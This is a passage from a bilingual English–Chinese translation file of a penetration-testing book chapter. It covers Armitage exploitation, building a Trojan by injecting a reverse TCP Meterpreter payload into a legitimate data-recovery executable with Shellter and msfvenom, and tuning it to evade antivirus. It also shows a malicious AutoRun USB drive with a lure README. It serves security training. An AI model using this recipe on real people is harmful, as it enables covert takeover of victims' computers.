  zh: '![图 7.8 – 浏览我们获取的攻击](image/Figure_7.8_B17616.jpg)'
- en: Figure 7.8 – Browsing our procured attacks
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.8 – 浏览我们获取的攻击
- en: Click **Launch** to fire off the attack as a background job so that you can
    keep working while waiting for that connection to come back (if that’s how you
    configured it).
  id: totrans-168
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击 **Launch** 以在后台启动攻击，这样你可以在等待连接返回时继续工作（如果你是这样配置的话）。
- en: Remember, Armitage likes to make things look Hollywood, so if your target is
    compromised, the icon changes to a very ominous lightning bolt.
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
  zh: 记住，Armitage 喜欢让事情看起来像好莱坞大片，因此，如果你的目标被攻陷，图标会变成一个非常不祥的闪电符号。
- en: 'Right-click on the target again and you’ll see that a new option is now available
    – **Shell**. You can interact with it and move on from the foothold, as shown
    here:'
  id: totrans-170
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 再次右键点击目标，你会看到一个新的选项——**Shell**。你可以与它交互，并从立足点继续前进，如下所示：
- en: '![Figure 7.9 – Compromised Linux host ](image/Figure_7.9_B17616.jpg)'
  id: totrans-171
  prefs: []
  type: TYPE_IMG
  zh: '![图 7.9 – 被攻陷的 Linux 主机](image/Figure_7.9_B17616.jpg)'
- en: Figure 7.9 – Compromised Linux host
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.9 – 被攻陷的 Linux 主机
- en: All of this automation is fantastic for professionals in the field, but we should
    be careful not to lose touch with the hacker’s way of thinking, which makes this
    all possible.
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
  zh: 所有这些自动化功能对于该领域的专业人士来说非常棒，但我们应该小心不要失去与黑客思维方式的联系，正是这种思维方式让这一切成为可能。
- en: A word about Armitage and the pen tester mentality
  id: totrans-174
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 关于 Armitage 和渗透测试人员心态的一些话
- en: Every time I go for a drive, I notice an extremely common feature in newer cars
    – the blind spot warning light on the side mirror. It lights up to warn the driver
    that a vehicle is in its blind spot. Overall, I’m a supporter of advancing technology
    to make our lives a little easier, and I’m sure this feature is useful. However,
    I worry that some drivers may stop being vigilant if they come to rely on this
    kind of technology. I wonder if drivers have stopped turning their heads to check
    their blind spots.
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
  zh: 每次开车时，我都会注意到一个在新车中非常常见的功能——侧后视镜上的盲区警示灯。它亮起时提醒驾驶员有车辆进入盲区。总的来说，我支持通过先进的技术让我们的生活更轻松，我相信这个功能是有用的。然而，我担心一些驾驶员可能会停止保持警觉，如果他们过于依赖这种技术的话。我想知道，驾驶员是否已经停止转头查看盲区。
- en: The issue of blind spots is relevant to Armitage and pen testing because it’s
    sort of like a new technology that drives the car for us, without us having to
    know a single thing about driving. Metasploit was already a revolutionary way
    to automate security testing, and Armitage automates it even further. Long before
    Metasploit existed, even in the 1990s, most of the tasks we take for granted today
    were accomplished manually. When tools were at our disposal, we had to manually
    correlate outputs to develop the understanding that’s necessary for any attack,
    and this was years after the true pioneers developed everything we needed to know.
    Most modern tools allow us to get far more work done in very rigid time frames,
    allowing us to focus on analysis so that we can bring value to the client. There
    is, however, the rise of the script kiddie to contend with, as well as inexperienced
    but passionate hopefuls who download Kali Linux and fire offensive weapons with
    reckless abandon. Despite some complaints, these tools do have a place, so long
    as they are used to improve our lives without replacing basic common sense.
  id: totrans-176
  prefs: []
  type: TYPE_NORMAL
  zh: 盲区问题与 Armitage 和渗透测试的关系在于，它有点像一种新技术，它为我们开车，而我们不需要了解任何关于驾驶的知识。Metasploit 已经是自动化安全测试的一种革命性方式，而
    Armitage 进一步自动化了它。在 Metasploit 存在之前，甚至在 1990 年代，大多数我们今天理所当然认为的任务都是手动完成的。当工具可用时，我们必须手动关联输出，以便开发出进行任何攻击所需的理解，而这已经是在真正的先驱者们开发出我们所需的所有知识之后的几年了。大多数现代工具允许我们在非常严格的时间框架内完成更多的工作，使我们能够专注于分析，从而为客户带来价值。然而，我们也必须应对“脚本小子”的崛起，以及一些缺乏经验但充满热情的新人，他们下载
    Kali Linux，毫无顾忌地发起攻击。尽管有一些抱怨，但这些工具确实有其存在的价值，只要它们是用来改善我们的生活，而不是取代基本的常识。
- en: With that in mind, it’s recommended that you find out what’s going on behind
    the scenes. Review the code, analyze the packets on the network, research not
    only the details of the attack and exploit but also the design intent of the affected
    technology, read the RFCs, and try to accomplish a task without the tool – or,
    better yet, write a better tool. This is a fantastic opportunity to better yourself.
  id: totrans-177
  prefs: []
  type: TYPE_NORMAL
  zh: 有鉴于此，建议你了解幕后发生的事情。回顾代码，分析网络中的数据包，不仅研究攻击和利用的细节，还要了解受影响技术的设计意图，阅读RFC文档，并尝试在没有工具的情况下完成任务——或者更好的是，编写一个更好的工具。这是一个极好的机会来提升自己。
- en: Moving forward, we’re going to facilitate a social engineering attack with a
    malicious USB drive. Once the drive has been plugged into a Windows machine, we
    will have a Meterpreter session and be able to take control.
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们将通过一个恶意USB驱动器来发起社会工程攻击。一旦将驱动器插入Windows机器，我们将拥有一个Meterpreter会话，并能够控制目标。
- en: Social engineering attacks with Metasploit payloads
  id: totrans-179
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 带有Metasploit有效载荷的社会工程攻击
- en: Let’s wrap this chapter up by bringing together two topics – backdoor injection
    into a legitimate executable and using Metasploit as the payload generator and
    handler. We’re going to use Shellter and nested Meterpreter payloads to create
    a malicious AutoRun USB drive. Although AutoRun isn’t often enabled by default,
    you may find it enabled in certain corporate environments. Even if AutoRun doesn’t
    execute automatically, we’re going to work with an executable that may encourage
    the user to execute it by creating the impression that there’s deleted data on
    the drive that can be recovered.
  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们通过将两个主题结合起来结束本章——将后门注入合法可执行文件，并使用Metasploit作为有效载荷生成器和处理器。我们将使用Shellter和嵌套的Meterpreter有效载荷来创建一个恶意的AutoRun
    USB驱动器。尽管AutoRun默认情况下通常未启用，但你可能会发现它在某些企业环境中已启用。即使AutoRun没有自动执行，我们也将处理一个可执行文件，该文件可能通过创建一种有已删除数据可以恢复的印象，诱使用户执行它。
- en: Creating a Trojan with Shellter
  id: totrans-181
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用Shellter创建木马
- en: 'Follow these steps to create a Trojan with Shellter:'
  id: totrans-182
  prefs: []
  type: TYPE_NORMAL
  zh: 按照以下步骤使用Shellter创建一个木马：
- en: The first and the most tedious step is finding a suitable executable. This is
    tricky because Shellter has certain limitations – the executables have to be 32-bit,
    they can’t be packed executables, and they need to play nice with our payloads.
    We won’t know an executable works until we bother to infect a file and try running
    it. After digging around for a suitable executable, we found a 400-something-kilobyte
    data recovery tool called **DataRecovery.exe**. This requires no installation
    and has no dependencies.
  id: totrans-183
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 第一步也是最繁琐的一步是找到合适的可执行文件。这很棘手，因为Shellter有一些限制——可执行文件必须是32位的，不能是打包过的可执行文件，并且需要与我们的有效载荷兼容。我们无法在感染文件并尝试运行之前确定某个可执行文件是否有效。经过一番寻找，我们发现了一个大约400多KB的数据恢复工具，名为**DataRecovery.exe**。这个工具不需要安装，也没有任何依赖项。
- en: 'After confirming that the recovery tool is 32-bit and clean, put it in your
    root folder to work on later. First, we want to create a nested payload with **msfvenom**.
    We don’t need to do this part, but we’re trying to give the attack a little pizzazz.
    Do this with the following command line:'
  id: totrans-184
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在确认恢复工具是32位并且干净后，将它放到你的根文件夹中，以便稍后使用。首先，我们要使用**msfvenom**创建一个嵌套的有效载荷。我们不必做这部分，但我们尝试给攻击增加一些炫酷的效果。使用以下命令行来执行此操作：
- en: msfvenom --arch x86 --platform windows --payload windows/messagebox ICON=WARNING
    TITLE="Data Restore" TEXT="Recoverable deleted files detected." --format raw >
    message
  id: totrans-185
  prefs:
  - PREF_IND
  - PREF_H1
  type: TYPE_NORMAL
  zh: msfvenom --arch x86 --platform windows --payload windows/messagebox ICON=WARNING
    TITLE="数据恢复" TEXT="检测到可恢复的已删除文件。" --format raw > message
- en: 'We should now have two files in the root folder: the executable and a 268-byte
    binary file called **message**. Now, fire up Shellter in Stealth Mode by passing
    **Y** to the prompt. This requires the same process we talked about earlier in
    this chapter until we need to specify our custom payload, as shown in the following
    screenshot:'
  id: totrans-186
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们应该在根文件夹中有两个文件：可执行文件和一个名为**message**的268字节二进制文件。现在，通过向提示输入**Y**来启动Shellter的隐匿模式。这需要我们按照本章前面提到的相同过程，直到我们需要指定自定义有效载荷，如下图所示：
- en: '![Figure 7.10 – Specifying the custom payload ](image/Figure_7.10_B17616.jpg)'
  id: totrans-187
  prefs: []
  type: TYPE_IMG
  zh: '![图 7.10 – 指定自定义有效载荷](image/Figure_7.10_B17616.jpg)'
- en: Figure 7.10 – Specifying the custom payload
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.10 – 指定自定义有效载荷
- en: Now, Shellter is going to spit out **DataRecovery.exe**; a quick **sha1sum**
    command will soon confirm that the binary has been modified. At this point, we
    have a legitimate data recovery tool that displays a message box. Now, it’s time
    to make it work for us.
  id: totrans-189
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，Shellter 将生成 **DataRecovery.exe**；一个快速的 **sha1sum** 命令很快就能确认二进制文件已经被修改。此时，我们拥有了一个合法的数据恢复工具，它会显示一个消息框。接下来，是时候让它为我们服务了。
- en: 'Now that we have the nested payload, we will simply send the new binary through
    Shellter one more time. This time, however, we must select the number 1 stager
    on the list of included payloads – the reverse TCP Meterpreter payload. Now, we
    have a complete Trojan that’s ready to rock. The program is a legitimate data
    recovery utility that pops up an advisory, warning users that deleted data has
    been detected. Meanwhile, the Meterpreter payload has phoned home to our handler
    and given us control, as shown in the following screenshot:'
  id: totrans-190
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们有了嵌套的有效载荷，我们只需再次通过 Shellter 发送新的二进制文件。不过，这次我们必须在包含的有效载荷列表中选择编号为 1 的阶段 –
    反向 TCP Meterpreter 有效载荷。现在，我们有了一个完整的 Trojan，准备启动。这个程序是一个合法的数据恢复工具，它会弹出一个提示框，警告用户检测到已删除的数据。同时，Meterpreter
    有效载荷已经与我们的处理程序建立连接，并给予了我们控制权，如下图所示：
- en: '![Figure 7.11 – The Trojan after injecting the message box payload, ready for
    the connect-back code ](image/Figure_7.11_B17616.jpg)'
  id: totrans-191
  prefs: []
  type: TYPE_IMG
  zh: '![图 7.11 – 注入消息框有效载荷后的 Trojan，准备连接回代码](image/Figure_7.11_B17616.jpg)'
- en: Figure 7.11 – The Trojan after injecting the message box payload, ready for
    the connect-back code
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.11 – 注入消息框有效载荷后的 Trojan，准备连接回代码
- en: Note
  id: totrans-193
  prefs: []
  type: TYPE_NORMAL
  zh: 注意
- en: When you configure your handler, always set **EXITFUNC** as a thread. If you
    don’t, the Meterpreter session will die when the Trojan does!
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
  zh: 配置处理程序时，始终将 **EXITFUNC** 设置为线程。如果不这样做，Meterpreter 会话在 Trojan 结束时会崩溃！
- en: 'By the way, we improved our evasion with this one – now, we’re undetected by
    75% of antivirus vendors, as shown in the following screenshot:'
  id: totrans-195
  prefs: []
  type: TYPE_NORMAL
  zh: 顺便提一下，我们通过这个手法提高了隐蔽性 – 现在，我们能避开 75% 的杀毒软件厂商，如下图所示：
- en: '![Figure 7.12 – Improving our stealth by tweaking our strategy ](image/Figure_7.12_B17616.jpg)'
  id: totrans-196
  prefs: []
  type: TYPE_IMG
  zh: '![图 7.12 – 通过调整策略提高我们的隐蔽性](image/Figure_7.12_B17616.jpg)'
- en: Figure 7.12 – Improving our stealth by tweaking our strategy
  id: totrans-197
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.12 – 通过调整策略提高我们的隐蔽性
- en: This is a notable example of how much fine-tuning plays a role in the art of
    AV evasion. What happened with this executable that made it look a little better
    than the last? Was it the double pass through Shellter, or the use of a custom
    innocuous payload? There are many moving parts to antivirus detection, so it’s
    hard to say, but keep in mind that you will probably need to play around in the
    lab before you deploy one of your creations. In my experience, it usually took
    trying a few different tricks before I got around a target’s defense.
  id: totrans-198
  prefs: []
  type: TYPE_NORMAL
  zh: 这是一个典型例子，说明了微调在抗病毒逃避艺术中的重要作用。这个可执行文件发生了什么变化，使其看起来比上次更好？是通过 Shellter 的双重处理，还是使用了自定义的无害有效载荷？抗病毒检测有很多变量，很难说清楚，但请记住，在部署你的作品之前，你可能需要在实验室里多做一些测试。根据我的经验，通常我需要尝试几种不同的技巧，才能突破目标的防御。
- en: Preparing a malicious USB drive for Trojan delivery
  id: totrans-199
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 为 Trojan 交付准备恶意 USB 驱动器
- en: 'There are just two steps left – one is technical (though very simple), while
    the other is purely for social engineering purposes. Let’s start with the technical
    step, which is creating the **autorun** file:'
  id: totrans-200
  prefs: []
  type: TYPE_NORMAL
  zh: 剩下的只有两个步骤 – 一个是技术性的（虽然非常简单），另一个纯粹是为了社会工程学的目的。让我们从技术步骤开始，即创建 **autorun** 文件：
- en: 'This is as simple as creating a text file called **autorun.inf** that points
    to our executable. It must start with the line **[autorun]**, with the file that
    is to be opened identified by **open=**. Microsoft defines other AutoRun commands,
    but **open=** is the only one we need. You can also add the **icon=** command,
    which will make the drive appear as the executable’s icon (or any other icon you
    define), as shown here:'
  id: totrans-201
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 这其实很简单，只需要创建一个名为 **autorun.inf** 的文本文件，指向我们的可执行文件。它必须以 **[autorun]** 开头，文件中打开的程序由
    **open=** 指定。微软定义了其他的 AutoRun 命令，但 **open=** 是我们需要的唯一命令。你还可以添加 **icon=** 命令，这将使驱动器显示为可执行文件的图标（或任何你定义的图标），如图所示：
- en: '![Figure 7.13 – Typing up the AutoRun file ](image/Figure_7.13_B17616.jpg)'
  id: totrans-202
  prefs: []
  type: TYPE_IMG
  zh: '![图 7.13 – 输入 AutoRun 文件](image/Figure_7.13_B17616.jpg)'
- en: Figure 7.13 – Typing up the AutoRun file
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.13 – 输入 AutoRun 文件
- en: 'Now, it’s time for the social engineering part. What if AutoRun doesn’t work?
    After all, it is disabled on a lot of systems these days. Remember that if someone
    went so far as to plug in our drive, they’ll see the files. To hint that running
    **DataRecovery.exe** is worth the risk, we will add an enticing **README** file.
    The file will make it look like deleted files are available for recovery. Curiosity
    gets the best of a lot of people. Take a look at the following screenshot:'
  id: totrans-204
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，到了社会工程部分。如果AutoRun不起作用怎么办？毕竟，现在很多系统都禁用了它。记住，如果有人愿意插入我们的驱动器，他们会看到文件。为了暗示运行**DataRecovery.exe**值得冒险，我们将添加一个诱人的**README**文件。这个文件会让它看起来像是删除的文件可以恢复。好奇心是很多人的软肋。看看以下截图：
- en: '![Figure 7.14 – Typing up our psychological README ](image/Figure_7.14_B17616.jpg)'
  id: totrans-205
  prefs: []
  type: TYPE_IMG
  zh: '![图 7.14 – 输入我们的心理学README](image/Figure_7.14_B17616.jpg)'
- en: Figure 7.14 – Typing up our psychological README
  id: totrans-206
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.14 – 输入我们的心理学README
- en: You may know better than to fall for this, but imagine scattering 100 USB drives
    throughout the public areas of your client. Don’t you think you’d get a hit? You
    only need it to work once – a valuable lesson for your clients.
  id: totrans-207
  prefs: []
  type: TYPE_NORMAL
  zh: 你可能知道不要轻易上当，但想象一下在客户的公共区域散布100个USB驱动器。你不觉得会有反应吗？你只需要它工作一次 —— 这是对客户的宝贵教训。
- en: Summary
  id: totrans-208
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter, we learned about more advanced Metasploit usage. We took our
    payload generation skills to the next level by leveraging a tool outside of the
    Metasploit Framework, Shellter, to leverage Metasploit payloads. We also explored
    the capabilities of **msfvenom**, today’s union of what used to be Metasploit’s
    payload and encoder tools. After payloads, we looked at how to build a custom
    module with Ruby and how to get it working within Metasploit. We then examined
    making Metasploit use highly organized and efficient with the Armitage frontend
    GUI. We also demonstrated how to enumerate and exploit a target in Armitage. Finally,
    we learned how to leverage Metasploit payloads to construct powerful social engineering
    attacks. In the true hacking spirit, the next chapter is going to take us deeper
    into how the processor sees our tidbits of code.
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们学习了更多高级的Metasploit使用方法。我们通过使用Metasploit框架之外的工具——Shellter，将有效载荷生成技能提升到了一个新水平，利用Metasploit有效载荷。我们还探索了**msfvenom**的功能，今天它将以前的Metasploit有效载荷和编码器工具结合起来。接着在了解了有效载荷之后，我们学习了如何使用Ruby构建自定义模块，并使其在Metasploit中运行。然后，我们检查了如何通过Armitage前端GUI使Metasploit变得高度组织化和高效。我们还演示了如何在Armitage中枚举和利用目标。最后，我们学习了如何利用Metasploit有效载荷来构建强大的社会工程攻击。秉承真正的黑客精神，下一章将带领我们更深入地了解处理器如何看待我们的代码片段。
- en: Questions
  id: totrans-210
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 问题
- en: 'Answer the following questions to test your knowledge of this chapter:'
  id: totrans-211
  prefs: []
  type: TYPE_NORMAL
  zh: 回答以下问题以测试你对本章内容的掌握：
- en: What are the three types of payload?
  id: totrans-212
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 有哪三种类型的有效载荷？
- en: __________ is a common example of a hex byte that can break the execution of
    our payload.
  id: totrans-213
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: __________是一个常见的十六进制字节，它会破坏我们有效载荷的执行。
- en: Which **msfvenom** flag should be used to specify that the payload is to run
    on an x86 instruction set architecture?
  id: totrans-214
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 应该使用哪个**msfvenom**标志来指定有效载荷在x86指令集架构上运行？
- en: In Ruby, **def** defines a _______.
  id: totrans-215
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在Ruby中，**def**定义一个_______。
- en: What’s the difference between **print_good()** and **print_status()**?
  id: totrans-216
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: '**print_good()**和**print_status()**有什么区别？'
- en: There is only one target view in Armitage. (True | False)
  id: totrans-217
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: Armitage中只有一个目标视图。（正确 | 错误）
- en: When you’re sending Shellter Stealth Mode payloads, _________ should always
    be set to ________ when you’re configuring options for **windows/meterpreter/reverse_tcp**.
  id: totrans-218
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 当你发送Shellter隐身模式的有效载荷时，______应该始终设置为______，当你为**windows/meterpreter/reverse_tcp**配置选项时。
- en: All modern Windows hosts enable AutoRun by default. (True | False)
  id: totrans-219
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 所有现代Windows主机默认启用AutoRun。（正确 | 错误）
- en: Further reading
  id: totrans-220
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 深入阅读
- en: 'For more information regarding the topics that were covered in this chapter,
    take a look at the following resources:'
  id: totrans-221
  prefs: []
  type: TYPE_NORMAL
  zh: 有关本章所涉及的主题的更多信息，请查看以下资源：
- en: 'The Shellter project home page: [https://www.shellterproject.com/](https://www.shellterproject.com/)'
  id: totrans-222
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Shellter项目主页：[https://www.shellterproject.com/](https://www.shellterproject.com/)
- en: 'Documentation on running Windows applications with Wine32: [https://www.winehq.org/documentation](https://www.winehq.org/documentation)'
  id: totrans-223
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用Wine32运行Windows应用程序的文档：[https://www.winehq.org/documentation](https://www.winehq.org/documentation)
- en: 'The Metasploit Framework on GitHub: [https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)'
  id: totrans-224
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: GitHub上的Metasploit框架：[https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)
